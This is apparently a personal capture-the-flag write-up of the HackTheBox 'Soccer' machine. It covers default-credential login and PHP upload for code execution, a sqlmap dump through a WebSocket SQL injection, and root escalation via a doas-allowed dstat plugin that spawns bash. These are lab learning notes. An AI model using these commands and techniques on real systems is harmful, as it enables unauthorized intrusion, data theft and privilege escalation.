first nmap

`sudo nmap -sC -sV -p- -oN soccer -T4 10.10.11.194
`
![[Pasted image 20240524224700.png]]

starting with the web port 80

nothing interesting at the main page let's fuzz
![[Pasted image 20240524224828.png]]

we got tiny
`ffuf -u http://soccer.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic
`
![[Pasted image 20240524224903.png]]

we have tiny file manager
![[Pasted image 20240524224934.png]]

a quick google search got as the default creds ==admin admin@123==
we can upload anything we want , so let's upload a php file and get rce 

![[Pasted image 20240524225229.png]]

![[Pasted image 20240524225251.png]]

nothing Interesting , I will run ==linpeas== 

we got another subdomain , listening on port 80 
![[Pasted image 20240524225701.png]]

after adding it to our /etc/hosts file  
![[Pasted image 20240524225753.png]]

same website but new functionality 

let's create new account and login into the app 

we got this /check page , it seems like it's check for a ticket if it's available in the database 

![[Pasted image 20240524230140.png]]

![[Pasted image 20240524230153.png]]

the weird thing is I try to intercept this request but I can't catch it 
![[Pasted image 20240524230353.png]]

if we want to catch this , we need to start intercepting from the beginning , like from the sign-in part that's at least what I learned from watching ippsec solving it 

![[Pasted image 20240524230529.png]]

there's a  boolean injection via this websocket , if the query i correct returns Exists else return doesn't exist
![[Pasted image 20240524230732.png]]
let's use ==sqlmap== to exploit it 
`sqlmap -u ws://soc-player.soccer.htb:9091  --data '{"id":"80989"}' --dbms  mysql --risk 3 --level 5 --batch --dump --thread 10
`
![[Pasted image 20240524230947.png]]

we can ssh as player
![[Pasted image 20240524231335.png]]

`find / -perm -4000 2>/dev/null
`
![[Pasted image 20240524231328.png]]

![[Pasted image 20240524231422.png]]


small research about doas seems like small sudo o something like that 
and we need to find a doas.conf file so we now which command is running 

we can run ==dstat== as root
`cat /usr/local/etc/doas.conf`
![[Pasted image 20240524231722.png]]
https://gtfobins.github.io/gtfobins/dstat/
![[Pasted image 20240524231758.png]]

`echo 'import os; os.execv("/bin/bash", ["bash"])' > /usr/local/share/dstat/dstat_d0s3nt.py`
`doas -u root /usr/bin/dstat --d0s3nt`

![[Pasted image 20240524232504.png]]